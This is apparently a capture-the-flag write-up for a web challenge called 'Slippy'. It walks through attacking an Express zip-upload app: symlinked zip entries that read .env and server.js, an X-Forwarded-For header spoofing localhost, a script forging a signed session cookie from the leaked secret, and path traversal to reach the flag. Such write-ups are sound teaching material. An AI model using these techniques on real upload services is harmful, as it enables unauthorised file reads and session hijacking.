# WEB/SLIPPY 
## Description 
Slipping Jimmy keeps playing with Finger.

## Challenge Overview 

So we were given an Node.js/Express web application and on that we could upload the zip files and we could see the unzipped files on the /files endpoint and
on seeing the Dockerfile we see that the flag is being stored as flag.txt in a randomly named directoy(8 char aphanumeric name) 
```Dockerfile
RUN rand_dir="/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"; mkdir "$rand_dir" && echo "TFCCTF{Fake_fLag}" > "$rand_dir/flag.txt" && chmod -R +r "$rand_dir"
```
So the first obvious try was to get path traversal by uploading zip file with a name like `../` or something but this would give unzip error which 
indicates the version of unzip used on the server is modern and secure.

All the routes were listed in index.js but the most important route was `/debug/file` endpoint where we could see that there is clear path traversal vulnerability 

```javascript
router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
```

and there was nothing to protect it except the middleware (developmentOnly.js) that was being used  

```javascript
module.exports = function (req, res, next) {
    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
      return next();
    }
    res.status(403).send('Forbidden: Development access only');
  };
```
Its just checking if our `session.userId` is `develop` or not and also the `req.ip` is from `127.0.0.1`. 

Well the second check could just be bypassed by simply adding the header `X-Forwarded-For: 127.0.0.1` in our request
and if you don't know what does this do then in simple terms the [X-Forwarded-For](https://devsec-blog.com/2025/04/understanding-the-x-forwarded-for-http-header-security-risks-and-best-practices/) 
header helps applications identify the original client IP when requests pass through a proxy or a load balancer and if the server blindfully trusts this header then 
we can do this.

For the first check we would need set our userId: develop and we can't do that without the `SESSION_SECRET` and we can see in server.js that a certain userId is being 
set as develop usinf the session secret stored in `.env` file.
```javascript
const store = new session.MemoryStore();
const sessionData = {
    cookie: {
      path: '/',
      httpOnly: true,
      maxAge: 1000 * 60 * 60 * 48 // 1 hour
    },
    userId: 'develop'
};
store.set('<REDACTED>', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
  });

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: store
}));
```
Ok then we have to get to read the `.env` file and also the `server.js` file to to forge a cookie that has access the /debug endpoint 
Since we were not able the get path traversal by changing file name,I thought we could use zipped symlinks (A symlink is a symbolic 
Linux/ UNIX link that points to another file or folder on your computer, or a connected file system. This is similar to a Windows shortcut.)
so I tried to read the .env file with it
```bash
ln -s ../../.env env_link
zip --symlinks env.zip env_link
```
and Guess what we got the `.env` file from this and then we got `SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b` 
now we do the same the thing to read the server.js to to see which userId is being set as develop and we get that `SessionId = amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E` 
then we would forge a cookie using this script 
```javascript
const signature = require('cookie-signature');

const sessionId = 'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E';

const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b'; 

const signedSessionId = signature.sign(sessionId, secret);

const cookieValue = `s:${signedSessionId}`;
console.log("Set your 'connect.sid' cookie value to this:");
console.log(cookieValue);
```
Then using this forged cookie and X-Forwarded-Host we make a request to to the `/debug/files?session_id=develop` to check if we are getting access 

<img width="707" height="106" alt="image" src="https://github.com/user-attachments/assets/c18511db-1cd6-45be-abd5-ab75562b02fe" />

and YES we are getting access so now using path traversal I get to know that flag is in `tlhedn6f`directory  
so using the symlink trick again I downloaded the flag and 
That's how we get the FLAG 


